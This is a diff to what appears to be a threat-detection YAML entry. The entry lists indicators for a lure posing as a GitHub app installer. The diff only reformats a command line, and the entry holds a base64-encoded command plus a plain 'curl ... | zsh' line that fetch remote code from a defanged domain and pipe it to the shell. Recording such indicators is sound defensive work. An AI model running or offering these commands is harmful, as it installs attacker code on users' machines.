@@ -8,9 +8,7 @@ TTPs:
   - powershell.exe
   - zsh
   commandline:
-  - 'echo GitHub-AppInstaller: https://dl.github[.]com/drive-file-stream/GitHubApplicationSetup.dmg
-    && echo ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL3Nlc3RyYWluaW5n[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|base64
-    -D|zsh'
+  - 'echo GitHub-AppInstaller: https://dl.github[.]com/drive-file-stream/GitHubApplicationSetup.dmg && echo ZWNobyAnSW5zdGFsbGluZyBwYWNrYWdlcyBwbGVhc2Ugd2FpdC4uLicgJiYgY3VybCAta2ZzU0wgaHR0cDovL3Nlc3RyYWluaW5n[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|base64  -D|zsh'
   - echo Installing packages please wait... && curl -kfsSL http://sestraining[.]com/curl/0ba44d64963765fb64db6a8f2f80deeb8735b24ab988eff22668a38be81eb4be|zsh
   powershell: []
   scripting_engine:
